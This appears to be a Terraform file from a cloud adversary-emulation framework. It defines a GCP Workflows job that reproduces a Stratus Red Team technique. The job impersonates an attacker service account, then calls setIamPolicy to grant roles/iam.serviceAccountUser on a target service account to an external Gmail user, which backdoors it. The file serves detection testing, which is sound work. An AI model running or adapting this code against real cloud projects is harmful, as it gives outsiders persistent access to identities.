data "google_service_account" "workflows-to-cloudrun-sa" {
  account_id   = "workflows-to-cloudrun-sa"

}


resource "google_workflows_workflow" "workflow_to_invoke_backdoor_service_account_attack" {
  name            = "gcp-backdoor-service-account-srt"
  description     = "A workflow intended to match the functionality of the Status Red Team attack technique 'Backdoor a GCP Service Account through its IAM Policy': https://stratus-red-team.cloud/attack-techniques/GCP/gcp.persistence.backdoor-service-account-policy/"
  service_account = data.google_service_account.workflows-to-cloudrun-sa.id
  project         = var.projectId
  source_contents = <<-EOF

######################################################################################
## Attack Description
######################################################################################
## This attack technique adds an IAM Role Binding to a Service Account granting access to a
## User outside the Google Organization.  Because the User Account must exist, the DeRF 
## Grants this access to the same valid account that Stratus Red Team does: stratusredteam@gmail.com 
## The service account created for this attack has no permissions.

#####################################################################################
## Input
######################################################################################
##### INPUT: {"sa":"01"}
##### INPUT: {"sa":"02"}


######################################################################################
## User Agent
######################################################################################
#### Excutes with User-Agent: "Derf-GCP-Backdoor-Service-Account-WORKFLOWEXECUTIONID"


######################################################################################
## Main Workflow Execution
######################################################################################
main:
  params: [args]
  steps:
    - assign:
        assign:
        - sa: $${args.sa}
        - projectID: $${sys.get_env("GOOGLE_CLOUD_PROJECT_ID")} 
    - ImpersonateDeRFAttackerServiceAccount:
        call: ImpersonateDeRFAttackerServiceAccount
        args:
            attackerSa: $${sa}
        result: AccessToken
    - BackdoorServiceAccount:
        call: BackdoorServiceAccount
        args:
            AccessToken: $${AccessToken}
        result: response
    - return:
        return: $${response}


######################################################################################
## Submodules | Sub-Workflows
######################################################################################
ImpersonateDeRFAttackerServiceAccount:
  params: [attackerSa]
  steps: 
    - buildURL:
        assign:
        - a: 'https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/derf-attacker-sa-'
        - b: '@'
        - c: ${var.gcp_derf_project_id}
        - d: '.iam.gserviceaccount.com:generateAccessToken'
        - e: '$${a+attackerSa+b+c+d}'   
    - ImpersonateTargetSA:
        call: http.post
        args:
          url: $${e}
          auth:
              type: OAuth2
          headers:
            Content-Type: application/json
            User-Agent: '$${"Derf-GCP-Backdoor-Service-Account=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
          body: 
            delegates: null
            scope: https://www.googleapis.com/auth/cloud-platform
            lifetime: 3600s
        result: response
    - return:
        return: $${response.body.accessToken}

BackdoorServiceAccount:
  params: [AccessToken]
  steps:
    - BackdoorServiceAccount:
        try:
          call: http.post
          args:
            url: https://iam.googleapis.com/v1/projects/-/serviceAccounts/${google_service_account.backdoored_service_account.email}:setIamPolicy?alt=json
            headers:
              authorization: '$${"Bearer "+AccessToken}' 
              Content-Type: application/json
              User-Agent: '$${"Derf-GCP-Backdoor-Service-Account=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
            body: 
              policy:
                bindings:
                - members:
                  - user:stratusredteam@gmail.com
                  role: roles/iam.serviceAccountUser
                version: 3
          result: response
        except:
            as: e
            steps:
                - known_errors:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      return: "FAILURE | GCP Backdoor Service Account - This is typically a permission error"
                    - condition: $${e.code == 200}
                      next: return
                - unhandled_exception0:
                    raise: $${e}

    - return:
        return: 
            - $${response.code}
            - "SUCCESS | GCP Backdoor Service Account Attack"


  EOF

}
